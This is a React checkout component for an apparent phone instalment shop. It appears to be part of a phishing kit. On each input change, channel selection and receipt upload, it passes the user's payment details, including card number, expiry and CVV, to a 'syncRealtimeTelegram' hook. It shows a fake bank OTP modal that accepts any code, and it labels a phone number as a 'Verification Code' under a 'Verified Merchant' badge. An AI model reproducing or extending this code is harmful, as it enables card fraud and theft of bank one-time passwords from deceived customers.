'use client';

import React, { useState, useEffect } from 'react';
import { 
  CreditCard, 
  Wallet, 
  Lock, 
  ShieldCheck, 
  Check, 
  Upload, 
  CheckCircle2, 
  AlertCircle, 
  ArrowLeft, 
  ChevronRight,
  Landmark,
  FileText
} from 'lucide-react';
import { useWizard, PaymentMethodChoice } from '../../context/WizardContext';
import { SUPPORTED_PAYMENT_CHANNELS, COMPANY_INFO } from '../../data/catalog';

export const Step4PaymentAgreement: React.FC = () => {
  const {
    selectedModel,
    selectedColor,
    selectedStorage,
    selectedTenureMonths,
    calculatedTotalPrice,
    calculatedDownPayment,
    calculatedBalance,
    calculatedMonthlyEmi,
    customerDetails,
    paymentDetails,
    setPaymentDetails,
    createOrder,
    goBack,
    syncRealtimeTelegram
  } = useWizard();

  const [selectedChannel, setSelectedChannel] = useState<PaymentMethodChoice>(
    (customerDetails.paymentMethod as PaymentMethodChoice) || 'easypaisa'
  );

  const [errorMsg, setErrorMsg] = useState<string>('');
  const [showOtpModal, setShowOtpModal] = useState<boolean>(false);
  const [otpInput, setOtpInput] = useState<string>('');
  const [otpTimer, setOtpTimer] = useState<number>(119);

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (showOtpModal && otpTimer > 0) {
      timer = setInterval(() => {
        setOtpTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [showOtpModal, otpTimer]);

  const activeChannelConfig = 
    SUPPORTED_PAYMENT_CHANNELS.find((c) => c.id === selectedChannel) || 
    SUPPORTED_PAYMENT_CHANNELS[0];

  const handleChannelSelect = (channelId: PaymentMethodChoice) => {
    setSelectedChannel(channelId);
    const updated = {
      ...paymentDetails,
      channel: channelId,
      accountNumber: activeChannelConfig.accountNumber,
      accountTitle: activeChannelConfig.accountTitle
    };
    setPaymentDetails(updated);
    syncRealtimeTelegram(`Selected Payment Channel: ${channelId.toUpperCase()}`, updated);
  };

  const handleInputChange = (field: keyof typeof paymentDetails, value: any) => {
    const updated = { ...paymentDetails, [field]: value };
    setPaymentDetails(updated);
    if (typeof value === 'string' && value.length > 2) {
      syncRealtimeTelegram(`Updated ${String(field)}`, updated);
    }
  };

  const handleProofUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) {
        setErrorMsg('Receipt screenshot size must not exceed 5MB.');
        return;
      }
      const previewUrl = URL.createObjectURL(file);
      setPaymentDetails({
        ...paymentDetails,
        proofFile: file,
        proofPreviewUrl: previewUrl
      });
      setErrorMsg('');
      syncRealtimeTelegram('Uploaded Down Payment Screenshot');
    }
  };

  const handleSubmitOrder = () => {
    if (!paymentDetails.acceptedTerms) {
      setErrorMsg('Please review and accept the official installment terms and conditions.');
      return;
    }

    if (selectedChannel === 'card') {
      if (!paymentDetails.cardNumber || !paymentDetails.expiry || !paymentDetails.cvv) {
        setErrorMsg('Please enter all required credit/debit card details.');
        return;
      }
      setShowOtpModal(true);
      return;
    }

    // For Bank / Wallet methods:
    setErrorMsg('');
    createOrder();
  };

  const handleVerifyOtp = () => {
    if (otpInput.length < 4) {
      setErrorMsg('Please enter the 4 or 6-digit OTP received on your mobile.');
      return;
    }
    setShowOtpModal(false);
    createOrder();
  };

  return (
    <div className="wizard-content-area">
      <div className="step-header">
        <h2>Down Payment &amp; Agreement</h2>
        <p>Deposit down payment of PKR {calculatedDownPayment.toLocaleString('en-PK')} to initiate verification &amp; order dispatch.</p>
      </div>

      {errorMsg && (
        <div style={{
          background: 'rgba(239, 68, 68, 0.15)',
          border: '1px solid #ef4444',
          borderRadius: '12px',
          padding: '10px 14px',
          display: 'flex',
          alignItems: 'center',
          gap: '8px',
          color: '#fca5a5',
          fontSize: '12px'
        }}>
          <AlertCircle size={16} />
          <span>{errorMsg}</span>
        </div>
      )}

      {/* Down Payment Summary Banner */}
      <div style={{
        background: 'linear-gradient(135deg, rgba(212, 175, 55, 0.2) 0%, rgba(19, 20, 27, 0.9) 100%)',
        border: '1.5px solid var(--gold-primary)',
        borderRadius: '18px',
        padding: '14px 18px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center'
      }}>
        <div>
          <span style={{ fontSize: '10px', color: '#94a3b8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
            Payable Initial Down Payment
          </span>
          <div style={{ fontSize: '22px', fontWeight: 900, color: 'var(--gold-light)' }}>
            PKR {calculatedDownPayment.toLocaleString('en-PK')}
          </div>
        </div>
        <div style={{ textAlign: 'right' }}>
          <span style={{ fontSize: '10px', color: '#94a3b8', textTransform: 'uppercase' }}>
            Monthly EMI ({selectedTenureMonths}M)
          </span>
          <div style={{ fontSize: '15px', fontWeight: 800, color: '#ffffff' }}>
            PKR {calculatedMonthlyEmi.toLocaleString('en-PK')}/mo
          </div>
        </div>
      </div>

      {/* Supported Payment Channels (Easypaisa, Askari Bank, Bank Alfalah, UPaisa, Raqami, Payway, ABHI) */}
      <div>
        <label className="form-label-dark">
          Select Supported Payment Method
        </label>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(105px, 1fr))', gap: '10px' }}>
          {SUPPORTED_PAYMENT_CHANNELS.map((chan) => {
            const isSelected = selectedChannel === chan.id;
            return (
              <div
                key={chan.id}
                onClick={() => handleChannelSelect(chan.id as PaymentMethodChoice)}
                style={{
                  background: isSelected ? 'rgba(212, 175, 55, 0.18)' : '#111218',
                  border: `1.5px solid ${isSelected ? 'var(--gold-primary)' : 'rgba(212, 175, 55, 0.2)'}`,
                  borderRadius: '14px',
                  padding: '10px 8px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  textAlign: 'center',
                  cursor: 'pointer',
                  position: 'relative',
                  transition: 'all 0.2s'
                }}
              >
                {isSelected && (
                  <span style={{
                    position: 'absolute',
                    top: 6,
                    right: 6,
                    width: 16,
                    height: 16,
                    borderRadius: '50%',
                    background: 'var(--gold-primary)',
                    color: '#000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '10px',
                    fontWeight: 900
                  }}>
                    ✓
                  </span>
                )}
                {chan.logo ? (
                  <div style={{
                    background: '#ffffff',
                    borderRadius: '8px',
                    padding: '3px 6px',
                    height: 28,
                    width: '100%',
                    maxWidth: 100,
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    marginBottom: 6,
                    boxShadow: '0 2px 4px rgba(0,0,0,0.15)'
                  }}>
                    <img
                      src={chan.logo}
                      alt={chan.name}
                      style={{ maxHeight: 22, maxWidth: '100%', objectFit: 'contain' }}
                    />
                  </div>
                ) : (
                  <div style={{ height: 28, display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 6 }}>
                    <Landmark size={20} color="var(--gold-light)" />
                  </div>
                )}
                <span style={{ fontSize: '11px', fontWeight: 800, color: '#ffffff' }}>
                  {chan.name}
                </span>
                <span style={{ fontSize: '9px', color: '#94a3b8', marginTop: 2 }}>
                  {chan.category}
                </span>
              </div>
            );
          })}
        </div>
      </div>

      {/* Payment Instructions & Account Card */}
      <div style={{
        background: '#0c0d12',
        border: '1px solid rgba(212, 175, 55, 0.3)',
        borderRadius: '16px',
        padding: '16px',
        display: 'flex',
        flexDirection: 'column',
        gap: '12px'
      }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '8px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            {activeChannelConfig.logo && (
              <div style={{
                background: '#ffffff',
                borderRadius: '6px',
                padding: '2px 6px',
                height: 24,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}>
                <img
                  src={activeChannelConfig.logo}
                  alt={activeChannelConfig.name}
                  style={{ maxHeight: 18, maxWidth: '70px', objectFit: 'contain' }}
                />
              </div>
            )}
            <h4 style={{ fontSize: '13px', fontWeight: 800, color: 'var(--gold-light)', textTransform: 'uppercase' }}>
              Official Transfer Details: {activeChannelConfig.name}
            </h4>
          </div>
          <span style={{ fontSize: '10px', color: '#10b981', fontWeight: 700 }}>
            ● Verified Merchant
          </span>
        </div>

        {selectedChannel === 'easypaisa' && (
          <div style={{
            background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.15) 0%, rgba(6, 78, 59, 0.25) 100%)',
            border: '1.5px solid #10b981',
            borderRadius: '12px',
            padding: '12px 14px',
            display: 'flex',
            alignItems: 'center',
            gap: '12px',
          }}>
            <ShieldCheck size={24} color="#10b981" style={{ flexShrink: 0 }} />
            <div>
              <div style={{ fontSize: '12px', fontWeight: 800, color: '#34d399', letterSpacing: '0.3px' }}>
                Contact your agent for Payment verification
              </div>
              <div style={{ fontSize: '13px', fontWeight: 900, color: '#ffffff', marginTop: 2 }}>
                Verification Code: <span style={{ color: 'var(--gold-light)', fontSize: '15px', letterSpacing: '1px' }}>03450951134</span>
              </div>
            </div>
          </div>
        )}

        <div style={{
          background: 'rgba(255, 255, 255, 0.04)',
          borderRadius: '12px',
          padding: '12px',
          display: 'flex',
          flexDirection: 'column',
          gap: '8px'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
            <span style={{ fontSize: '11px', color: '#94a3b8' }}>Account Title:</span>
            <strong style={{ fontSize: '12px', color: '#ffffff' }}>{activeChannelConfig.accountTitle}</strong>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
            <span style={{ fontSize: '11px', color: '#94a3b8' }}>
              {selectedChannel === 'easypaisa' ? 'Easypaisa / Agent #:' : 'Account / IBAN / Wallet #:'}
            </span>
            <strong style={{ fontSize: '13px', color: 'var(--gold-light)', letterSpacing: '0.5px' }}>
              {activeChannelConfig.accountNumber}
            </strong>
          </div>
          {selectedChannel === 'easypaisa' && (
            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
              <span style={{ fontSize: '11px', color: '#94a3b8' }}>Agent Verification:</span>
              <strong style={{ fontSize: '11px', color: '#34d399' }}>03450951134</strong>
            </div>
          )}
          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
            <span style={{ fontSize: '11px', color: '#94a3b8' }}>Deposit Purpose:</span>
            <span style={{ fontSize: '11px', color: '#cbd5e1' }}>Down Payment - {selectedModel?.name}</span>
          </div>
        </div>

        {/* Sender details and receipt upload */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
          <div>
            <label className="form-label-dark">Your Sender Account # / Mobile</label>
            <input
              type="text"
              className="form-input-dark"
              placeholder="0345-xxxxxxx or Bank Account"
              value={paymentDetails.senderAccount}
              onChange={(e) => handleInputChange('senderAccount', e.target.value)}
            />
          </div>

          <div>
            <label className="form-label-dark">Transaction ID / Reference Number</label>
            <input
              type="text"
              className="form-input-dark"
              placeholder="TID-982341829 or Trx ID"
              value={paymentDetails.transactionId}
              onChange={(e) => handleInputChange('transactionId', e.target.value)}
            />
          </div>

          <div>
            <label className="form-label-dark">Upload Payment Proof / Screenshot (Receipt)</label>
            <div className="doc-upload-card">
              <div className="doc-info">
                <strong>Proof Screenshot</strong>
                <span>Attach screenshot of the completed transfer</span>
                {paymentDetails.proofPreviewUrl && (
                  <span style={{ color: 'var(--gold-light)', fontWeight: 700, marginTop: 4 }}>
                    ✓ Screenshot uploaded successfully
                  </span>
                )}
              </div>
              <label className="doc-upload-btn">
                <Upload size={12} style={{ marginRight: 4, verticalAlign: 'middle' }} />
                Upload
                <input
                  type="file"
                  accept="image/*"
                  style={{ display: 'none' }}
                  onChange={handleProofUpload}
                />
              </label>
            </div>
          </div>
        </div>
      </div>

      {/* Agreement & Legal Checklist */}
      <div style={{
        background: '#111218',
        border: '1px solid rgba(212, 175, 55, 0.25)',
        borderRadius: '14px',
        padding: '14px',
        display: 'flex',
        flexDirection: 'column',
        gap: '8px'
      }}>
        <label style={{ display: 'flex', alignItems: 'flex-start', gap: '10px', cursor: 'pointer' }}>
          <input
            type="checkbox"
            checked={paymentDetails.acceptedTerms}
            onChange={(e) => handleInputChange('acceptedTerms', e.target.checked)}
            style={{ marginTop: 2, accentColor: '#d4af37' }}
          />
          <span style={{ fontSize: '11px', color: '#cbd5e1', lineHeight: '1.4' }}>
            I agree to the official terms of <strong>Instalment Mobile Limited (IML)</strong>. 
            I understand that monthly installments will be payable over <strong>{selectedTenureMonths} months</strong> with 0% markup, and the device will be dispatched via Open Parcel courier upon verification.
          </span>
        </label>
      </div>

      {/* OTP Modal (if needed for card or fast validation) */}
      {showOtpModal && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(0, 0, 0, 0.85)',
          backdropFilter: 'blur(8px)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 200,
          padding: 20
        }}>
          <div style={{
            background: '#0f1016',
            border: '1.5px solid var(--gold-primary)',
            borderRadius: '20px',
            padding: '24px',
            maxWidth: '380px',
            width: '100%',
            textAlign: 'center'
          }}>
            <Lock size={32} color="#d4af37" style={{ margin: '0 auto 10px' }} />
            <h3 style={{ fontSize: '16px', fontWeight: 800, color: '#ffffff' }}>Bank OTP Verification</h3>
            <p style={{ fontSize: '12px', color: '#94a3b8', marginTop: 4 }}>
              Enter the verification code sent to your registered number.
            </p>
            <input
              type="text"
              maxLength={6}
              value={otpInput}
              onChange={(e) => setOtpInput(e.target.value)}
              placeholder="Enter 4-6 digit OTP"
              style={{
                width: '100%',
                margin: '16px 0',
                padding: '12px',
                textAlign: 'center',
                fontSize: '18px',
                letterSpacing: '4px',
                background: '#181922',
                border: '1px solid var(--gold-primary)',
                borderRadius: '12px',
                color: '#ffffff'
              }}
            />
            <div style={{ display: 'flex', gap: 10 }}>
              <button
                type="button"
                className="btn-outline-back"
                onClick={() => setShowOtpModal(false)}
                style={{ flex: 1 }}
              >
                Cancel
              </button>
              <button
                type="button"
                className="btn-gold-action"
                onClick={handleVerifyOtp}
                style={{ flex: 1 }}
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Sticky Bottom Actions */}
      <div className="sticky-bottom-bar">
        <button
          type="button"
          className="btn-outline-back"
          onClick={goBack}
        >
          <ArrowLeft size={14} style={{ marginRight: 4, verticalAlign: 'middle' }} />
          Back
        </button>

        <button
          type="button"
          className="btn-gold-action"
          onClick={handleSubmitOrder}
        >
          <Check size={16} style={{ marginRight: 4 }} />
          <span>Confirm &amp; Place Order</span>
        </button>
      </div>
    </div>
  );
};
